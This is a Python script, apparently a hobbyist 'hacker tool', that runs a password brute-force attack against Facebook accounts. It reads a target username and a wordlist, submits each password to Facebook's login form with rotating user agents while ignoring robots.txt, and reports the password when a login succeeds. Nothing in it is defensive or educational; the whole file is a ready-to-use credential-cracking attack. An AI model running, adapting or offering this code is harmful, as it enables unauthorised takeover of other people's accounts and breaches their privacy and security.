#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random
import os
import time

#pip
print(' _         _  _')
print('| |__  ___| || |')
print("| '_ \/ __| || |_ ")
print('| |_) \__ \__   _|')
print('|_.__/|___/  |_|')
time.sleep(1.5)
os.system('pip3 install requests bs4')
print(' _ __ ___   ___  ___| |__   __ _ _ __ (_)_______')
print("| '_ ` _ \ / _ \/ __| '_ \ / _` | '_ \| |_  / _ \ ")
print('| | | | | |  __/ (__| | | | (_| | | | | |/ /  __/')
print('|_| |_| |_|\___|\___|_| |_|\__,_|_| |_|_/___\___|')
os.system('pip2 install mechanize')


os.system("clear")
#Gereksinim
os.system('pkg install python')
os.system('pkg install python2')
os.system('pkg install pip')
os.system('pkg install pip3')



print('_____              ____              _')
print('|  ___|_ _  ___ ___| __ )  ___   ___ | | __')
print('| |_ / _` |/ __/ _ \  _ \ / _ \ / _ \| |/ /')
print('|  _| (_| | (_|  __/ |_) | (_) | (_) |   <')
print('|_|  \__,_|\___\___|____/ \___/ \___/|_|\_\ ')
print('                          brute tool v 1.0')


email = str(raw_input("Username : "))


passwordlist = str(raw_input("Wordlist : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
os.system("clear")
def welcome():
	wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |              Hacker Tools               | 
        |	           Version 1.0            |
        +=========================================+
            |..........  Face-Bruter  ........|
            +---------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
